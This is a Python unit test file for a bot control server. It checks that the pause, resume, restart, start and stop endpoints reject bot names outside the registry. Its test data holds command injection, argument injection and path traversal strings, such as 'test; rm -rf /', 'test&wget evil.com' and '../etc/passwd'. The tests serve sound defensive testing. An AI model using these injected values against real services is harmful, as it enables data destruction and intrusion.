"""Tests for control_server.py bot name validation on pause/resume endpoints.

Ticket: CB-3373907-31AA — pause/resume endpoints lack bot name validation
against BOT_REGISTRY, enabling path traversal and command injection.

Constitution §2 mandates:
- Input validation at trust boundaries
- No arbitrary file operations via user-supplied data
"""
from __future__ import annotations

import json
import unittest
from io import BytesIO
from unittest.mock import MagicMock, patch


class TestPauseResumeBotValidation(unittest.TestCase):
    """Verify that pause and resume endpoints validate bot names against BOT_REGISTRY."""

    def _make_handler(self, method: str, path: str, body: dict | None = None):
        """Create a mock request handler for testing."""
        from codebot.control_server import ControlHandler

        handler = MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = method
        handler.headers = {"Authorization": "Bearer test-token"}
        if body is not None:
            handler.rfile = BytesIO(json.dumps(body).encode())
            handler.headers["Content-Length"] = str(len(json.dumps(body)))
        else:
            handler.rfile = BytesIO(b"")
            handler.headers["Content-Length"] = "0"
        return handler

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_unknown_bot(self):
        """Pause endpoint must return 404 for bot names not in BOT_REGISTRY."""
        # Import the actual do_POST to test routing logic
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/pause")

        # Call the real method bound to our mock
        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0, "Handler must produce a response")
        status_code, body = responses[0]
        self.assertEqual(status_code, 404, f"Expected 404 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_unknown_bot(self):
        """Resume endpoint must return 404 for bot names not in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/resume")

        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0, "Handler must produce a response")
        status_code, body = responses[0]
        self.assertEqual(status_code, 404, f"Expected 404 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_path_traversal(self):
        """Pause endpoint must reject bot names containing path traversal sequences."""
        from codebot.control_server import ControlHandler

        malicious_names = [
            "../../etc/cron.d/evil",
            "../secrets/token",
            "bot/../../../etc/passwd",
        ]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/pause")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            ControlHandler.do_POST(handler)

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, _ = responses[0]
            self.assertNotEqual(status_code, 200,
                                f"Pause must not succeed for path traversal name: {name}")

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_path_traversal(self):
        """Resume endpoint must reject bot names containing path traversal sequences."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/../../etc/cron.d/evil/resume")
        responses = []
        handler._json = lambda code, data: responses.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        ControlHandler.do_POST(handler)

        self.assertTrue(len(responses) > 0)
        status_code, _ = responses[0]
        self.assertNotEqual(status_code, 200, "Resume must not succeed for path traversal name")

    def test_pause_accepts_valid_bot(self):
        """Pause endpoint must accept bot names present in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                with patch("codebot.control_server._safe_kill_bot_process", return_value=(True, [1234])):
                    handler = self._make_handler("POST", "/bots/valid_bot/pause")
                    responses = []
                    handler._json = lambda code, data: responses.append((code, data))
                    handler._auth = lambda: True
                    handler._read_json_body = lambda: ({"force": True}, None, None)

                    mock_paused_file = MagicMock()
                    mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                    ControlHandler.do_POST(handler)

                    self.assertTrue(len(responses) > 0)
                    status_code, body = responses[0]
                    self.assertEqual(status_code, 200, f"Expected 200 for valid bot, got {status_code}: {body}")
                    self.assertTrue(body["ok"])
                    self.assertEqual(body["paused"], "valid_bot")
                    # Verify killed_pids is included in response
                    self.assertIn("killed_pids", body)

    def test_resume_accepts_valid_bot(self):
        """Resume endpoint must accept bot names present in BOT_REGISTRY."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                with patch("subprocess.Popen"):
                    handler = self._make_handler("POST", "/bots/valid_bot/resume")
                    responses = []
                    handler._json = lambda code, data: responses.append((code, data))
                    handler._auth = lambda: True
                    handler._read_json_body = lambda: (None, None, None)

                    mock_paused_file = MagicMock()
                    mock_paused_file.exists.return_value = False
                    mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                    ControlHandler.do_POST(handler)

                    self.assertTrue(len(responses) > 0)
                    status_code, body = responses[0]
                    self.assertEqual(status_code, 200, f"Expected 200 for valid bot, got {status_code}: {body}")


    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pkill_not_called_with_unvalidated_input_pause(self):
        """pkill must never be called when bot name is not in BOT_REGISTRY (pause)."""
        from codebot.control_server import ControlHandler

        # Use names that are safe in URL paths but would be dangerous if passed to pkill
        malicious_names = ["evilbot", "fake_runner", "notreal"]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/pause")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            with patch("codebot.control_server.subprocess.run") as mock_run:
                ControlHandler.do_POST(handler)
                mock_run.assert_not_called()

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, body = responses[0]
            self.assertEqual(status_code, 404,
                             f"Expected 404 for unvalidated bot name '{name}', got {status_code}")
            self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_regex_injection_dot_star(self):
        """Pause endpoint must reject '.*' which could inject regex into pkill."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name (contains '.')
        handler = self._make_handler("POST", "/bots/.*/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_process_killing_python3(self):
        """Pause endpoint must reject 'python3' which could kill all python processes."""
        from codebot.control_server import ControlHandler

        # python3 is valid format but not in registry -> 404
        handler = self._make_handler("POST", "/bots/python3/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())

    def test_pause_dry_run_returns_preview(self):
        """Pause endpoint must return preview when dry_run is True."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "test_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            handler = self._make_handler("POST", "/bots/test_bot/pause", body={"dry_run": True})
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: ({"dry_run": True}, None, None)

            ControlHandler.do_POST(handler)

            self.assertTrue(len(responses) > 0)
            status_code, body = responses[0]
            self.assertEqual(status_code, 200)
            self.assertTrue(body["ok"])
            self.assertTrue(body["dry_run"])
            self.assertIn("preview", body)
            self.assertEqual(body["preview"]["action"], "pause")
            self.assertEqual(body["preview"]["bot"], "test_bot")

    def test_pause_requires_force_or_confirm(self):
        """Pause endpoint must require force or confirm when not dry_run."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "test_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            handler = self._make_handler("POST", "/bots/test_bot/pause", body={})
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: ({}, None, None)

            ControlHandler.do_POST(handler)

            self.assertTrue(len(responses) > 0)
            status_code, body = responses[0]
            self.assertEqual(status_code, 400)
            self.assertIn("destructive action", body.get("error", "").lower())

    def test_pause_handles_safe_kill_failure_with_warning(self):
        """Pause endpoint should still succeed even if _safe_kill_bot_process reports errors."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "test_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                # Mock _safe_kill_bot_process to return failure
                with patch("codebot.control_server._safe_kill_bot_process", return_value=(False, [])):
                    handler = self._make_handler("POST", "/bots/test_bot/pause", body={"force": True})
                    responses = []
                    handler._json = lambda code, data, r=responses: r.append((code, data))
                    handler._auth = lambda: True
                    handler._read_json_body = lambda: ({"force": True}, None, None)

                    mock_paused_file = MagicMock()
                    mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                    ControlHandler.do_POST(handler)

                    self.assertTrue(len(responses) > 0)
                    status_code, body = responses[0]
                    # Should still return 200 even if kill failed
                    self.assertEqual(status_code, 200)
                    self.assertTrue(body["ok"])

    def test_pause_handles_exception_in_try_block(self):
        """Pause endpoint should return 500 if an exception occurs during pause."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "test_bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            with patch("codebot.control_server.STATE_DIR") as mock_state:
                # Make write_text raise an exception
                mock_paused_file = MagicMock()
                mock_paused_file.write_text.side_effect = PermissionError("Access denied")
                mock_state.__truediv__ = MagicMock(return_value=mock_paused_file)

                handler = self._make_handler("POST", "/bots/test_bot/pause", body={"force": True})
                responses = []
                handler._json = lambda code, data, r=responses: r.append((code, data))
                handler._auth = lambda: True
                handler._read_json_body = lambda: ({"force": True}, None, None)

                ControlHandler.do_POST(handler)

                self.assertTrue(len(responses) > 0)
                status_code, body = responses[0]
                self.assertEqual(status_code, 500)
                self.assertIn("Access denied", body.get("error", ""))

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pkill_not_called_with_unvalidated_input_resume(self):
        """pkill/subprocess must never be called when bot name is not in BOT_REGISTRY (resume)."""
        from codebot.control_server import ControlHandler

        # Use names that are safe in URL paths but would be dangerous if passed to pkill
        malicious_names = ["evilbot", "fake_runner", "notreal"]

        for name in malicious_names:
            handler = self._make_handler("POST", f"/bots/{name}/resume")
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: (None, None, None)

            with patch("codebot.control_server.subprocess.Popen") as mock_popen, \
                 patch("codebot.control_server.subprocess.run") as mock_run:
                ControlHandler.do_POST(handler)
                mock_popen.assert_not_called()
                mock_run.assert_not_called()

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, body = responses[0]
            self.assertEqual(status_code, 404,
                             f"Expected 404 for unvalidated bot name '{name}', got {status_code}")
            self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_regex_injection_dot_star(self):
        """Resume endpoint must reject '.*' which could inject regex into pkill."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name (contains '.')
        handler = self._make_handler("POST", "/bots/.*/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_process_killing_python3(self):
        """Resume endpoint must reject 'python3' which could kill all python processes."""
        from codebot.control_server import ControlHandler

        # python3 is valid format but not in registry -> 404
        handler = self._make_handler("POST", "/bots/python3/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())


class TestCommandInjectionPrevention(unittest.TestCase):
    """Verify that command injection attempts are rejected across all endpoints.

    Ticket: CB-8897336-6B72 — Critical: Command injection via pkill in bot control handlers

    Acceptance Criteria:
    - Bot name validated against alphanumeric+hyphen pattern before subprocess calls
    - shlex.quote() applied to all interpolated values
    - security tests verify injection attempts are rejected
    """

    def _make_handler(self, method: str, path: str, body: dict | None = None):
        """Create a mock request handler for testing."""
        from codebot.control_server import ControlHandler

        handler = MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = method
        handler.headers = {"Authorization": "Bearer test-token"}
        if body is not None:
            handler.rfile = BytesIO(json.dumps(body).encode())
            handler.headers["Content-Length"] = str(len(json.dumps(body)))
        else:
            handler.rfile = BytesIO(b"")
            handler.headers["Content-Length"] = "0"
        return handler

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_injection_via_semicolon(self):
        """Restart endpoint must reject bot names containing semicolons."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/test; rm -rf /restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_pause_rejects_injection_via_backticks(self):
        """Pause endpoint must reject bot names containing backticks."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/test`whoami`/pause")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_resume_rejects_injection_via_dollar_sign(self):
        """Resume endpoint must reject bot names containing dollar signs."""
        from codebot.control_server import ControlHandler

        # Use injection attempt without / which would break URL routing
        handler = self._make_handler("POST", "/bots/test$(whoami)/resume")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_injection_via_semicolon(self):
        """Start endpoint must reject bot names containing semicolons."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test; rm -rf /"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test; rm -rf /"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_injection_via_pipe(self):
        """Start endpoint must reject bot names containing pipe characters."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test|cat /etc/passwd"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test|cat /etc/passwd"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_stop_rejects_injection_via_ampersand(self):
        """Stop endpoint must reject bot names containing ampersands."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/stop", body={"bots": ["test&wget evil.com"], "force": True})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test&wget evil.com"], "force": True}, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_validates_each_bot_name(self):
        """Start endpoint must validate each bot name in the array."""
        from codebot.control_server import ControlHandler

        # First bot is valid, second is malicious
        handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot", "evil; rm -rf /"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["valid-bot", "evil; rm -rf /"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    def test_start_accepts_valid_bot_names(self):
        """Start endpoint must accept valid bot names."""
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
        mock_bot.name = "valid-bot"

        with patch("codebot.control_server.BOT_REGISTRY", [mock_bot]):
            handler = self._make_handler("POST", "/bots/start", body={"bots": ["valid-bot"]})
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: ({"bots": ["valid-bot"]}, None, None)

            with patch("codebot.control_server.subprocess.Popen") as mock_popen:
                ControlHandler.do_POST(handler)
                mock_popen.assert_called_once()

            self.assertTrue(len(responses) > 0)
            status_code, body = responses[0]
            self.assertEqual(status_code, 200)
            self.assertTrue(body["ok"])

    def test_start_rejects_argument_like_names(self):
        """Start endpoint must reject argument-like names not in BOT_REGISTRY.

        Ticket: CB-666967-0D15 — Argument injection via unsanitized bot list.
        Acceptance Criteria: test with crafted argument-like names confirms rejection.
        """
        from codebot.control_server import ControlHandler

        # Names with shell/arg metachars are rejected by format validation (400);
        # syntactically valid names not in the registry are rejected as unknown (400).
        malicious_names = [
            "--help",
            "--config=/etc/passwd",
            "--verbose",
            "-c", "import os; os.system('rm -rf /')",
        ]

        for name in malicious_names:
            handler = self._make_handler("POST", "/bots/start", body={"bots": [name]})
            responses = []
            handler._json = lambda code, data, r=responses: r.append((code, data))
            handler._auth = lambda: True
            handler._read_json_body = lambda: ({"bots": [name]}, None, None)

            with patch("codebot.control_server.subprocess.Popen") as mock_popen:
                ControlHandler.do_POST(handler)
                mock_popen.assert_not_called()

            self.assertTrue(len(responses) > 0, f"Handler must respond for malicious name: {name}")
            status_code, body = responses[0]
            self.assertEqual(status_code, 400,
                             f"Expected 400 for argument-like name '{name}', got {status_code}")
            self.assertIn("bot", body.get("error", "").lower())

    def test_validate_bot_name_function(self):
        """Test the validate_bot_name function directly."""
        from codebot.control_server import validate_bot_name

        # Valid names
        self.assertTrue(validate_bot_name("valid-bot"))
        self.assertTrue(validate_bot_name("valid_bot"))
        self.assertTrue(validate_bot_name("ValidBot123"))
        self.assertTrue(validate_bot_name("a"))
        self.assertTrue(validate_bot_name("123"))

        # Invalid names
        self.assertFalse(validate_bot_name("test; rm -rf /"))
        self.assertFalse(validate_bot_name("test`whoami`"))
        self.assertFalse(validate_bot_name("test$(cat /etc/passwd)"))
        self.assertFalse(validate_bot_name("test|cat /etc/passwd"))
        self.assertFalse(validate_bot_name("test&wget evil.com"))
        self.assertFalse(validate_bot_name("test/../etc/passwd"))
        self.assertFalse(validate_bot_name("test space"))
        self.assertFalse(validate_bot_name(""))
        self.assertFalse(validate_bot_name(None))
        self.assertFalse(validate_bot_name(123))


    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_unknown_bot_with_400(self):
        """Start endpoint must return 400 for bot names not in BOT_REGISTRY.

        Ticket: CB-C006C847037C — Validate bot names against BOT_REGISTRY before subprocess execution.
        Acceptance Criteria: POST /bots/start with {"bots":["nonexistent"]} returns 400.
        Unknown names return 400 (not 404) to prevent enumeration and argument injection.
        """
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/start", body={"bots": ["nonexistent"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["nonexistent"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400, f"Expected 400 for unknown bot, got {status_code}")
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_malformed_newline_injection(self):
        """Start endpoint must reject bot names containing newlines."""
        from codebot.control_server import ControlHandler

        # Newline is invalid per validate_bot_name
        handler = self._make_handler("POST", "/bots/start", body={"bots": ["test\nrm -rf /"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["test\nrm -rf /"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_path_traversal(self):
        """Start endpoint must reject bot names containing path traversal sequences."""
        from codebot.control_server import ControlHandler

        # Path traversal is invalid per validate_bot_name
        handler = self._make_handler("POST", "/bots/start", body={"bots": ["../etc/passwd"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["../etc/passwd"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_help_flag(self):
        """Start endpoint must reject '--help' as it's not in registry and could be arg injection."""
        from codebot.control_server import ControlHandler

        # --help is valid format but not in registry -> 400 unknown bot
        handler = self._make_handler("POST", "/bots/start", body={"bots": ["--help"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": ["--help"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [MagicMock(name="valid-bot")])
    def test_start_rejects_regex_dot_star(self):
        """Start endpoint must reject '.*' which is invalid format."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name
        handler = self._make_handler("POST", "/bots/start", body={"bots": [".*"]})
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"bots": [".*"]}, None, None)

        with patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())


class TestRestartBotValidation(unittest.TestCase):
    """Verify that restart endpoint validates bot names against BOT_REGISTRY.

    Ticket: CB-1017888-B58B — Arbitrary process kill via pkill with attacker-controlled bot name.
    """

    def _make_handler(self, method: str, path: str, body: dict | None = None):
        """Create a mock request handler for testing."""
        from codebot.control_server import ControlHandler

        handler = MagicMock(spec=ControlHandler)
        handler.path = path
        handler.command = method
        handler.headers = {"Authorization": "Bearer test-token"}
        if body is not None:
            handler.rfile = BytesIO(json.dumps(body).encode())
            handler.headers["Content-Length"] = str(len(json.dumps(body)))
        else:
            handler.rfile = BytesIO(b"")
            handler.headers["Content-Length"] = "0"
        return handler

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_unknown_bot(self):
        """Restart endpoint must return 404 for bot names not in BOT_REGISTRY (with force=True)."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"force": True}, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run, \
             patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_unknown_bot_without_force(self):
        """Restart endpoint must return 404 for bot names not in BOT_REGISTRY (without force flag)."""
        from codebot.control_server import ControlHandler

        handler = self._make_handler("POST", "/bots/nonexistent_bot/restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        # No force flag in body
        handler._read_json_body = lambda: (None, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run, \
             patch("codebot.control_server.subprocess.Popen") as mock_popen:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()
            mock_popen.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_regex_injection_dot_star(self):
        """Restart endpoint must reject '.*' which could inject regex into pkill."""
        from codebot.control_server import ControlHandler

        # .* is invalid per validate_bot_name (contains '.')
        handler = self._make_handler("POST", "/bots/.*/restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"force": True}, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 400)
        self.assertIn("invalid bot name", body.get("error", "").lower())

    @patch("codebot.control_server.BOT_REGISTRY", [])
    def test_restart_rejects_process_killing_python3(self):
        """Restart endpoint must reject 'python3' which could kill all python processes."""
        from codebot.control_server import ControlHandler

        # python3 is valid format but not in registry -> 404
        handler = self._make_handler("POST", "/bots/python3/restart")
        responses = []
        handler._json = lambda code, data, r=responses: r.append((code, data))
        handler._auth = lambda: True
        handler._read_json_body = lambda: ({"force": True}, None, None)

        with patch("codebot.control_server.subprocess.run") as mock_run:
            ControlHandler.do_POST(handler)
            mock_run.assert_not_called()

        self.assertTrue(len(responses) > 0)
        status_code, body = responses[0]
        self.assertEqual(status_code, 404)
        self.assertIn("unknown bot", body.get("error", "").lower())

    def test_restart_accepts_valid_bot(self):
        """Restart endpoint must accept bot names present in BOT_REGISTRY.
        
        Updated for CB-1017888-B58B: Now uses _safe_kill_bot_process (pgrep + /proc verification)
        instead of direct pkill. Test verifies the secure kill path is invoked.
        """
        from codebot.control_server import ControlHandler

        mock_bot = MagicMock()
